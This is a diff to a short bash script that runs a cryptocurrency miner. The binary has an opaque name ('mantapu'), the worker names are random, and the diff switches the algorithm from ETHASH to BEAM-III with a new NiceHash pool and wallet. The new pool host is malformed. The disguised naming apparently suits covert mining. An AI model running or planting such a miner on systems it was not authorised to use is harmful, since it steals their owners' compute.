@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=daggerhashimoto.eu-north.nicehash.com:3353
-WALLET=36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.xroc2
+POOL=beamv3.eu-west_nicehash_com:3387
+WALLET=36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.xrocBEAM
 WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
 chmod +x mantapu
-./mantapu --algo ETHASH --pool $POOL --user $WALLET.$WORKER
+./mantapu --algo BEAM-III --pool $POOL --user $WALLET.$WORKER
